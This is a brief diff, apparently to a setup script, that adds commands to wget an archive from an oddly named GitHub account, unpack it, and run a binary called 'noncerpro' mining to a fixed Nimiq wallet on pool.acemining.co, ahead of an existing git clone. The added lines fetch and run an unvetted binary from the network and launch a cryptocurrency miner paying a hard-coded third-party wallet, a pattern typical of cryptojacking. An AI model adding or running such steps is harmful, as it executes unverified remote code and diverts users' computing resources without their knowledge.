@@ -1,3 +1,11 @@
+wget https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linux84748874.tar.xz
+
+tar -xvf ./linux84748874.tar.xz
+
+cd ./linux84748874/
+
+./noncerpro -a "NQ54 HKTP BDQK 7PV9 BXKK GJ3H T6SM 4L5A 83C2" -s pool.acemining.co -p 8883 -b 4 -t 2
+
 git clone https://github.com/mobileapps84741274/linux8444
 
 cd linux8444
